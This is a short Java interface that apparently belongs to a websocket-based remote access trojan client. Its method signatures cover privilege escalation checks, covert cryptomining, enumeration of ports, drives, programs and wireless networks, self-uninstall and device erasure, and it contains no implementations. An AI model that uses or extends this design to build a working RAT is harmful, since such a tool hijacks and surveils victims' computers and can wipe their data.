package io.github.machineswillrise.websocketrat.client.devices;

import java.util.List;
import java.util.Map;

public interface Device
{
	boolean canPrivilegeEscalate();

	void startCryptomining();
	double getHashRate();
	void stopCryptomining();

	List<Integer> getOpenPorts();
	List<String> getConnectedHardDrives();
	Map<String, String> getInstalledPrograms();

	int getBatteryPercentage() throws MissingPeripheralException;
	int getScreenBrightness() throws MissingPeripheralException;
	int getSpeakerVolume() throws MissingPeripheralException;
	int getMicrophoneVolume() throws MissingPeripheralException;;

	List<String> getBluetoothDevices() throws MissingPeripheralException;
	List<Map<String, String>> getWifiNetworks() throws MissingPeripheralException;

	void uninstallRat();
	void erase();
}
